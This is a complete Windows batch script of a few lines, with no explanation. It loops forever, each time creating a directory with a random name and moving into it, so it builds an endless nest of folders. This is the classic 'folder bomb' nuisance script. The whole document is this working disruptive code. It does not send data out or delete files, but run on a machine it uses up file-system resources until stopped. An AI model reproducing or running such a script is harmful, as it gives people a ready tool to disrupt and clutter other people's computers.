cls
@echo off
:loop
set pop= %random%
md %pop%
cd %pop%
goto loop
